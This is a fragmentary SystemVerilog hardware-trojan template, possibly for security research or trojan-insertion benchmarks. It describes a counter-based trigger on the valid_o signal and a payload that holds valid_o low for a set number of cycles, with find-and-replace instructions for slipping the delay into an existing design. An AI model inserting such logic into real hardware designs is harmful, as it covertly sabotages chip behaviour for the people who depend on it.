 ...
 *   
 * Trigger: Counter on valid_o
 * Payload: Delay valid_o by N cycles
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_active && valid_o) begin
...
// ============================================================
// Performance Degradation: Delay valid_o by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF valid_o is a ready/valid signal:
//   Find: assign valid_o = ready_condition;
//   Replace: assign valid_o = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF valid_o is in always_ff:
//   Find: valid_o <= ready_value;
//   Replace: valid_o <= (delay_counter == 0) ? ready_value : 1'b0;